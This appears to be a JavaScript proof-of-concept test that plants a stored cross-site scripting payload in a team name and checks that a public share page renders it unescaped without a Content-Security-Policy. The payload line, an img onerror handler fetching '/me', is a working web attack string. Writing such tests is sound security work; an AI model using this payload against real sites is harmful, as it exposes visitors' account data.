// The public share page inserts the team name without escaping it.
import { check, startApp } from './support/harness.mjs';

const payload = `<img src=x onerror="fetch('/me').then(r=>r.text()).then(alert)">`;

const app = await startApp();
const mallory = await app.signUp('mallory@example.com', 'Mallory');
const { body: team } = await mallory.post('/teams', { name: payload });
const { body: note } = await mallory.post(`/teams/${team.id}/notes`, { title: 'Read me', body: 'Hello' });
const { body: share } = await mallory.post(`/teams/${team.id}/notes/${note.id}/shares`, {});
const page = await app.client().get(new URL(share.url).pathname);
app.close();

console.log({ teamName: team.name, status: page.status, csp: page.headers.get('content-security-policy') });
console.log(page.body.split('\n').find((line) => line.startsWith('<footer>')));
check(
  team.name === payload &&
    page.status === 200 &&
    page.body.includes(`Shared from ${payload}`) &&
    page.headers.get('content-security-policy') === null,
  'a team name with markup is rendered raw on the public share page, with no CSP',
);
